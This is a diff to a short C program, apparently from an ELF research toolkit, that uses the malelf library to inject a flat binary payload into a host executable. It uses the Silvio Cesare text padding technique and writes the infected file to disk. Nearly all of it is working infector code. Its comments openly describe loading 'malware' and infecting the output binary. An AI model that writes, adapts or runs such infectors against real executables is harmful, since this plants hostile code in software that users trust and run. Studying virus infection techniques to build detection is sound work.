@@ -1,3 +1,6 @@
+/**
+ * Infects a host binary with the Silvio Cesare Text Padding Technique
+ */
 #include <stdio.h>
 
 #include <malelf/binary.h>
@@ -6,7 +9,7 @@
 
 int main(int argc, char **argv)
 {
-        MalelfBinary input, output, malware, malware_in;
+        MalelfBinary input, output, malware;
         unsigned long int magic_bytes = 0;
         _u32 error;
 
@@ -16,40 +19,21 @@ int main(int argc, char **argv)
                 return 0;
         }
 
+        /* Initialize the binaries structures */
         malelf_binary_init(&input);
         malelf_binary_init(&output);
         malelf_binary_init(&malware);
-        malelf_binary_init(&malware_in);
 
+        /* Open the input host binary */
         error = malelf_binary_open(&input, argv[1]);
         if (MALELF_SUCCESS != error) {
                 MALELF_PERROR(error);
                 return 1;
         }
 
-/*        error = malelf_binary_open(&output, argv[2]);
-        if (MALELF_SUCCESS != error) {
-                MALELF_PERROR(error);
-                return 1;
-                }*/
-
-        malware.class = MALELF_FLAT32;
-        malware_in.class = MALELF_FLAT32;
-        error = malelf_binary_open(&malware_in, argv[3]);
-        if (MALELF_SUCCESS != error) {
-                MALELF_PERROR(error);
-                return 1;
-        }
-
-        malware.fname = "/tmp/malware.bin";
-
-        _u32 magic_offset = 0;
-        error = malelf_shellcode_create_flat(&malware,
-                                             &malware_in,
-                                             &magic_offset,
-                                             0,
-                                             0);
-
+        /* Tell malelficus that the binary below is a assembled flat binary */
+        malware.class = MALELF_FLAT;
+        error = malelf_binary_open(&malware, argv[3]);
         if (MALELF_SUCCESS != error) {
                 MALELF_PERROR(error);
                 return 1;
@@ -57,23 +41,31 @@ int main(int argc, char **argv)
 
         output.fname = argv[2];
 
-        error = malelf_infect_silvio_padding32_new(&input,
-                                                   &output,
-                                                   &malware,
-                                                   0,
-                                                   magic_bytes);
+        /* Infects the output binary in memory with malware
+           using the silvio cesare text padding technique */
+        error = malelf_infect_silvio_padding(&input,
+                                             &output,
+                                             &malware,
+                                             0,
+                                             magic_bytes);
 
         if (MALELF_SUCCESS != error) {
                 MALELF_PERROR(error);
                 return 1;
         }
 
+        /* Write the infected memory structure on disk */
         error = malelf_binary_write(&output, output.fname, 1);
 
         if (MALELF_SUCCESS != error) {
                 MALELF_PERROR(error);
                 return 1;
         }
+
+        /* close files and deallocate memory */
+        malelf_binary_close(&input);
+        malelf_binary_close(&output);
+        malelf_binary_close(&malware);
 
         return 0;
 }
